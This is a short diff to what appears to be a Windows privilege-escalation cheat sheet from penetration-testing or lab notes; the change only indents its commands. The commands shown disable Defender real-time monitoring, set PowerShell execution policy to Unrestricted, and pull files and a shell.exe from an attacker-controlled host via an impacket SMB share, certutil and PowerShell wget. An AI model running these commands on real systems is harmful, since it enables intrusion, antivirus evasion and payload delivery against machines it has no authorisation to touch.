@@ -2,19 +2,19 @@
     whoami /priv
 
 ## Powershell
-Get-ExecutionPolicy    
-Set-ExecutionPolicy Unrestricted   
-Set-MpPreference -DisableRealtimeMonitoring $true  
+    Get-ExecutionPolicy    
+    Set-ExecutionPolicy Unrestricted   
+    Set-MpPreference -DisableRealtimeMonitoring $true  
 
 ## Kernel exploits   
     systeminfo | findstr /B /C:"OS Name" /C:"OS Version"   
 
 
 # File Transfer  
-sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .   
-copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe   
+    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .   
+    copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe   
 
-certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat   
+    certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat   
   
 ## Powershell
     powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
